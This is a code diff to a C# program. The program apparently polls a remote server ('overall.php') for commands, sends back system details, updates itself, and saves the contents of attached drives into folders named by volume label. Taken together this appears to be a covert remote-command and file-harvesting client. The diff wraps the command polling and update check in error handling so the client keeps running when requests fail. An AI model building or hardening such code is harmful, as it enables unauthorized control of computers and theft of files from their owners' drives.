@@ -115,7 +115,11 @@ internal class Program
                     var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" }, { "remains", Convert.ToString(freeSpace) }, { "version", version } });
                     client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                     // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
-                    string[] commands = client.PostAsync(classRegistered + "overall.php", content).Result.Content.ReadAsStringAsync().Result.Split('\n');
+                    string[] commands;
+                    try
+                    {
+                        commands = client.PostAsync(classRegistered + "overall.php", content).Result.Content.ReadAsStringAsync().Result.Split('\n');
+                    } catch { continue; }
                     foreach (string command in commands)
                     {
                         string[] splited = command.Split(' ');
@@ -307,22 +311,28 @@ internal class Program
                 using (HttpClient client = new HttpClient())
                 {
                     client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
-                    remoteVersion = client.GetAsync(remoteVersionUrl).Result.Content.ReadAsStringAsync().Result;
-                    if (remoteVersion != version)
+                    try
                     {
-                        try
+                        remoteVersion = client.GetAsync(remoteVersionUrl).Result.Content.ReadAsStringAsync().Result;
+                        if (remoteVersion != version)
                         {
-                            Process p = new Process();
-                            p.StartInfo.FileName = "Updater.exe";
-                            p.StartInfo.CreateNoWindow = false;
-                            p.Start();
-                            p = null;
-                            Environment.Exit(0);
+                            try
+                            {
+                                Process p = new Process();
+                                p.StartInfo.FileName = "Updater.exe";
+                                p.StartInfo.CreateNoWindow = false;
+                                p.Start();
+                                p = null;
+                                Environment.Exit(0);
+                            }
+                            catch (Exception e) { ErrorLogUpload(e, urlP1.Replace("/", "")); }
                         }
-                        catch (Exception e) { ErrorLogUpload(e, urlP1.Replace("/", "")); }
-                    }
+                    } catch { Thread.Sleep(30000); }
+
+
                 }
                 Thread.Sleep(30000);
+                
             }
 
         }
@@ -387,7 +397,7 @@ internal class Program
                     byte[] gb = gbk.GetBytes(item.VolumeLabel);
                     gb = Encoding.Convert(gbk, utf8, gb);
                     string saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
-                    string saveDirName = SaveRoot + $"{saveFileName}\\";
+                    string saveDirName = SaveRoot + $"\\{saveFileName}\\";
                     // Console.WriteLine(saveDirName);
                     fileCnt = 0;
                     localSaveRoot = saveDirName;
